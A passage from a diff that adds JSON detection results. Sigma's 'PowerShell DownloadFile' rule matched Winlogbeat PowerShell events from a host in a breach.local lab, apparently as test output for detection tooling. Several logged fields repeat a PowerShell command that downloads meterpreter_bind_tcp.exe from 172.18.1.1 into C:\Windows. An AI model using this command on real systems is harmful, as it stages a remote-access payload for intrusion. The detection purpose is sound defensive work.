+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Engine Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 403,
+                    "created": "2022-10-10T11:17:51.434Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 19,
+                    "type": [
+                        "end"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Engine state is changed from Available to Stopped. \n\nDetails: \n\tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=19\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=82f501e0-7931-4934-9d32-d46517111bf7\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "engine": {
+                        "new_state": "Stopped",
+                        "previous_state": "Available",
+                        "version": "5.1.19041.1237"
+                    },
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7"
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 403,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6598,
+                    "task": "Engine Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:51.166+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:51.178Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Executing Pipeline",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 4103,
+                    "created": "2022-10-10T11:17:51.437Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "Microsoft-Windows-PowerShell",
+                    "sequence": 18,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "CommandInvocation(Out-Default): \"Out-Default\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = 99dc06f6-7551-484b-b322-01da00740dca\n        Host Application = powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n        Engine Version = 5.1.19041.1237\n        Runspace ID = 82f501e0-7931-4934-9d32-d46517111bf7\n        Pipeline ID = 1\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 18\n        User = CLIENT1\\ssh\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:",
+                "powershell": {
+                    "command": {
+                        "invocation_details": [
+                            {
+                                "related_command": "Out-Default",
+                                "type": "CommandInvocation",
+                                "value": "\"Out-Default\""
+                            }
+                        ],
+                        "type": "Script"
+                    },
+                    "engine": {
+                        "version": "5.1.19041.1237"
+                    },
+                    "id": "Microsoft.PowerShell",
+                    "pipeline_id": "1",
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "runspace_id": "82f501e0-7931-4934-9d32-d46517111bf7"
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "related": {
+                    "user": "ssh"
+                },
+                "user": {
+                    "domain": "CLIENT1",
+                    "name": "ssh"
+                },
+                "winlog": {
+                    "activity_id": "{d359db81-dc8e-0000-71de-5ed38edcd801}",
+                    "api": "wineventlog",
+                    "channel": "Microsoft-Windows-PowerShell/Operational",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 4103,
+                    "opcode": "To be used when operation is just executing a method",
+                    "process": {
+                        "pid": 4368,
+                        "thread": {
+                            "id": 696
+                        }
+                    },
+                    "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
+                    "provider_name": "Microsoft-Windows-PowerShell",
+                    "record_id": 6091,
+                    "task": "Executing Pipeline",
+                    "user": {
+                        "domain": "CLIENT1",
+                        "identifier": "S-1-5-21-2755423373-3250654863-1302750906-1003",
+                        "name": "ssh",
+                        "type": "User"
+                    },
+                    "version": 1
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:51.178+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "total_hits": 15
+    }
+]
